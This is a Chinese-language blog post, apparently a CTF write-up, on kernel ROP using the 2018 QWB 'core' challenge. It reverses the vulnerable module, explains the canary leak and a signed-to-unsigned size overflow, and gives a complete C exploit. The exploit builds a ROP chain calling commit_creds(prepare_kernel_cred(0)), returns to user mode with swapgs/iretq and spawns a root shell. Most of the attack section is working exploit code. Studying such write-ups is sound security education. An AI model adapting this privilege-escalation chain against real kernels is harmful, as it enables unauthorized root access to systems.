---
layout: post
title:  "Kernel ROP"
date:   2020-3-15
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# Kernel ROP

> kernel rop还是🌶个rop

rop思路

commit_creds和prepare_kernel_cred是内核态函数，rop控制LKM执行rop执行commit_creds(prepare_kernel_cred(0))，cred改成root的cred

目标是起一个root权限的shell，这在内核态不好搞，所以在修改cred后应返回到用户态，执行system("/bin/sh")

![5](https://raw.githubusercontent.com/AiDaiP/images/master/kernel/5.jpg)

rop链

1. rop执行commit_creds(prepare_kernel_cred(0))
2. 返回到用户态执行system("/bin/sh")

如何返回到用户态

利用swapgs和iretq，rop链中放好cs,rflags,sp,ss

```
swapgs iretq rip cs rflags ss sp
```

返回到用户态，按rip继续执行

可以在exp中跑个函数存这些数据，再塞到rop链里

```c
// intel flavor assembly
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

// at&t flavor assembly
void save_stats() {
asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "movq %%rsp, %3\n"
    "pushfq\n"
    "popq %2\n"
    :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
    :
    : "memory"
);
}
```



## 强网杯2018-core

start.sh

```bash
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-s

```

init

```bash
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
  
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

#poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f

```

/proc/kallsyms看不了

但是有个cat /proc/kallsyms > /tmp/kallsyms

👴可以去/tmp/kallsyms看函数地址

dmesg也看不了

有个自动关机，给👴爬，注释掉

先写个fuck.sh，闷声发大财

```bash
#!/bin/bash
rm core/exp
gcc exp.c -static -masm=intel -g -o core/exp
cd core
./gen_cpio.sh ../core.cpio
cd ..
echo [*]fuck it
./start.sh

```

core.ko

```c
checksec core.ko
[*] '/home/aidai/Desktop/core/core/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)

```

init_module

```c
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk("\x016core: created /proc/core entry\n");
  return 0LL;
}
```

创建虚拟文件/proc/core

core_iotcl

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk("\x016core: %d\n");
      off = a3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

定义三条命令

core_read

```c
void __fastcall core_read(__int64 a1)
{
  __int64 v1; // rbx
  char *v2; // rdi
  signed __int64 i; // rcx
  char v4[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  v1 = a1;
  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n");
  v2 = v4;
  for ( i = 16LL; i; --i )
  {
    *v2 = 0;
    v2 += 4;
  }
  strcpy(v4, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(v1, &v4[off], 64LL) )
    __asm { swapgs }
}
```

从v4拷贝off个字节到用户空间，可以泄露canary

core_copy_func

```c
void __fastcall core_copy_func(signed __int64 a1)
{
  char v1[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( a1 > 0x3F )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, a1);// overflow
}
```

从全局变量name拷贝a1字节到v1，a1小于0x3f

a1是signed int64，qmemcpy用的是unsigned int16

传个0xffffffffffff0100，骨灰都给他🐏了

core_write

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx

  v3 = a3;
  printk("\x016core: called core_writen");
  if ( v3 <= 0x800 && !copy_from_user(name, a2, v3) )
    return v3;
  printk("\x016core: error copying data from userspacen");
  return 0xFFFFFFF2LL;
}
```

写name

思路

1. 先存一波cs,rflags,sp,ss，埋伏他一手

2. /tmp/kallsyms拿函数地址

3. 0x6677889C命令设置off，0x6677889B命令泄露canary

4. core_write在name构造rop链

   提权、回用户态、起shell

5. 0x6677889A，🐏了它

exp

```c
// gcc exploit.c -static -masm=intel -g -o exploit
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
    if(!getuid())
    {
        system("/bin/sh");
    }
    else
    {
        puts("[*]spawn shell error!");
    }
    exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;

size_t vmlinux_base = 0;
size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
    printf("[*]set off to %ld\n", idx);
    ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
    puts("[*]read to buf.");
    ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
    printf("[*]copy from user with size: %ld\n", size);
    ioctl(fd, 0x6677889A, size);
}

int main()
{
    save_status();
    int fd = open("/proc/core", 2);
    if(fd < 0)
    {
        puts("[*]open /proc/core error!");
        exit(0);
    }

    find_symbols();
    ssize_t offset = vmlinux_base - raw_vmlinux_base;

    set_off(fd, 0x40);

    char buf[0x40] = {0};
    core_read(fd, buf);
    size_t canary = ((size_t *)buf)[0];
    printf("[+]canary: %p\n", canary);

    size_t rop[0x1000] = {0};

    int i;
    for(i = 0; i < 10; i++)
    {
        rop[i] = canary;
    }
    rop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)

    rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret
    rop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret
    rop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; 
    rop[i++] = commit_creds;

    rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
    rop[i++] = 0;

    rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 

    rop[i++] = (size_t)spawn_shell;         // rip 

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);
    core_copy_func(fd, 0xffffffffffff0100);
    return 0;
}
```

rop链

返回到pop rdi; ret，0弹到rdi，ret到prepare_kernel_cred，执行prepare_kernel_cred(0)，返回值在rax

返回到pop rdx; ret，pop rcx; ret弹到rdx，ret到mov rdi, rax; call rdx，此时rdi为prepare_kernel_cred(0)返回值，call rdx执行pop rcx; ret，mov rdi, rax; call rdx弹到rcx; ，ret到commit_creds

commit_creds(prepare_kernel_cred(0))执行完毕

返回到swapgs; popfq; ret，popfq弹0，ret到 iretq; ret，回用户态，rip为spawn_shell，起shell

